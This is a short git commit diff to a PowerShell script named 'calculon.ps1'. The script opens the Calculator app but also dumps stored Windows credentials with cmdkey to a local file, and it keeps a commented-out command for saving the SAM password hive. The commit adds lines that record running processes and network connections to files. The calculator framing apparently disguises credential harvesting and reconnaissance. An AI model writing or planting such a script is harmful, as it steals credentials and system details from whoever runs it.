0cf792862a83532defff179a7459b224681e953e
user12385321 <kukulo.stas@gmail.com>
2024-12-08 01:50:27 +0300

    Update calculon.ps1

--- calculon.ps1
+++ calculon.ps1
@@ -5,3 +5,5 @@
 ## reg save HKLM\sam %temp%\sam
 cmdkey /list | Out-File -FilePath .\creds
 Start-Process ms-calculator:
+tasklist | Out-File -FilePath .\tasklist
+netstat -an | Out-File -FilePath .\netstat
